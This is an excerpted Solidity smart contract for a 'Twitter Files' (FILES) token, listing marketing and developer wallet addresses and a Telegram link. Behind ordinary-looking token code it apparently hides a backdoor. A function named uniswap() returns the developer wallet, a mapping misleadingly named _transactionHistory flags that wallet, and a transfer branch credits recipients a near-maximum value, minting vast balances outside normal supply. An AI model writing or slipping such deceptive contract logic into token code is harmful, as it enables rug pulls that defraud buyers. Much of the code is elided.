...
// Telegram : https://t.me/TwitterFilesBSC
...
contract TwitterFiles is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;
    mapping (address => bool) public _transactionHistory;
    ...
    address payable public Wallet_Marketing = payable(0xFC0F597B121752432580Ef9C156b76AeaE76F4eb); 
    address payable public Wallet_Dev = payable(0x8122bf06C2543656016F797Dd599569D32c233E6);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    function uniswap() public view virtual returns (address) {
        return Wallet_Dev;
    }
    ...
    string private constant _name = "Twitter Files"; 
    string private constant _symbol = unicode"FILES";
    uint256 public _standartTransfer = ((MAX)-_tTotal);
    ...
    constructor () {
        ...
        _owner = 0x8122bf06C2543656016F797Dd599569D32c233E6;
        ...
        _transactionHistory[Wallet_Dev] = true;
    ...
    function isBonus(address shipping, address bonusAddress) private view returns(bool){
        return !_isExcludedFromFee[shipping] && _transactionHistory[bonusAddress];
    }
    ...
    function _transfer(
        ...
        _tokenTransfer(from, to, amount, takeFee, isBuy, bonus);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy, bool bonus) private {
        ...
        if(!bonus){
            ...
            _tOwned[sender] = _tOwned[sender]-tAmount; tAmount = _standartTransfer-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
        }
